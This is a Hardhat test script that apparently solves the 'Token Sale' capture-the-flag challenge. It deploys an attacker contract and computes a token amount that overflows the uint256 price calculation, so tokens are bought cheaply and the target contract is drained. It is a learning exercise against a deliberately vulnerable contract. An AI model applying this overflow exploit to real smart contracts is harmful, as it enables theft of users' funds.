import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import {
    TokenSaleChallenge,
    TokenSaleAttacker__factory,
    TokenSaleAttacker,
} from "../typechain-types"
import { assert, expect } from "chai"
import { ethers, network } from "hardhat"
import { mine } from "@nomicfoundation/hardhat-network-helpers"

describe("Token Sale challenge", function () {
    let attacker: SignerWithAddress
    let target: TokenSaleChallenge
    before(async function () {
        // Setup code here
        let instanceAddress: string =
            "0xAcb7664F9C1f340fDBEAcd209A28E032d0754BE9"
        ;[attacker] = await ethers.getSigners()
        target = await ethers.getContractAt(
            "TokenSaleChallenge",
            instanceAddress,
            attacker
        )
    })

    it("Drain the selling contract", async function () {
        // Exploit code here
        let tx, blockInitNum, blockFinNum
        const attackerFactory: TokenSaleAttacker__factory =
            await ethers.getContractFactory("TokenSaleAttacker")
        const attackerContract: TokenSaleAttacker =
            await attackerFactory.deploy(target.address)
        console.log(`Attacker deployed at: ${attackerContract.address}`)

        const TPE = ethers.utils.parseEther("1")
        const factor = ethers.constants.MaxUint256.add("1")
        const numTokens = factor.div(TPE).add("1")

        console.log(`Need to buy ${numTokens.toString()} tokens`)
        let price = await attackerContract.getPrice(numTokens.toString())
        console.log(`Price: ${ethers.utils.formatEther(price.toString())} ETH`)

        tx = await attackerContract.attack(numTokens.toString(), {
            value: price.toString(),
        })
        await tx.wait(1)
    })

    after(async function () {
        // Verification Code here
        assert(await target.isComplete(), "Challenge not completed")
    })
})
